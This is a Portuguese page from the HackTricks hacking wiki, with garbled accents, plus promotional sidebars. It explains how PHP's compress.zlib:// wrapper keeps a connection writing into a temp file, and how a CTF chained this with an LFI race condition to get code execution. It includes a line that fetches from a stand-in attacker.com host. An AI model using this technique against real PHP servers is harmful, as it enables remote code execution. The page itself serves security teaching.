<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √© um mecanismo de busca alimentado pela **dark web** que oferece funcionalidades **gratuitas** para verificar se uma empresa ou seus clientes foram **comprometidos** por **malwares ladr√µes**.

O principal objetivo do WhiteIntel √© combater tomadas de conta e ataques de ransomware resultantes de malwares que roubam informa√ß√µes.

Voc√™ pode verificar o site deles e experimentar o mecanismo gratuitamente em:

{% embed url="https://whiteintel.io" %}

---

## `compress.zlib://` e `PHP_STREAM_PREFER_STDIO`

Um arquivo aberto usando o protocolo `compress.zlib://` com a flag `PHP_STREAM_PREFER_STDIO` pode continuar gravando dados que chegam √† conex√£o posteriormente no mesmo arquivo.

Isso significa que uma chamada como:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Ir√° enviar uma solicita√ß√£o pedindo http://attacker.com/file, ent√£o o servidor pode responder √† solicita√ß√£o com uma resposta HTTP v√°lida, manter a conex√£o aberta e enviar dados extras algum tempo depois que tamb√©m ser√£o escritos no arquivo.

Voc√™ pode ver essa informa√ß√£o nesta parte do c√≥digo php-src em main/streams/cast.c:
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
## Condi√ß√£o de Corrida para RCE

[**Este CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) foi resolvido usando o truque anterior.

O atacante far√° o **servidor da v√≠tima abrir uma conex√£o lendo um arquivo do servidor do atacante** usando o protocolo **`compress.zlib`**.

**Enquanto** essa **conex√£o** existir, o atacante ir√° **extrair o caminho** para o arquivo tempor√°rio criado (√© vazado pelo servidor).

**Enquanto** a **conex√£o** estiver aberta, o atacante ir√° **explorar uma LFI carregando o arquivo tempor√°rio** que ele controla.

No entanto, h√° uma verifica√ß√£o no servidor web que **impede o carregamento de arquivos que contenham `<?`**. Portanto, o atacante ir√° abusar de uma **Condi√ß√£o de Corrida**. Na conex√£o que ainda est√° aberta, o **atacante** ir√° **enviar a carga √∫til PHP DEPOIS** do **servidor web** ter **verificado** se o arquivo cont√©m os caracteres proibidos, mas **ANTES de carregar seu conte√∫do**.

Para mais informa√ß√µes, consulte a descri√ß√£o da Condi√ß√£o de Corrida e do CTF em [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √© um mecanismo de busca alimentado pela **dark web** que oferece funcionalidades **gratuitas** para verificar se uma empresa ou seus clientes foram **comprometidos** por **malwares ladr√µes**.

O objetivo principal do WhiteIntel √© combater tomadas de contas e ataques de ransomware resultantes de malwares que roubam informa√ß√µes.

Voc√™ pode verificar o site deles e experimentar o mecanismo gratuitamente em:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
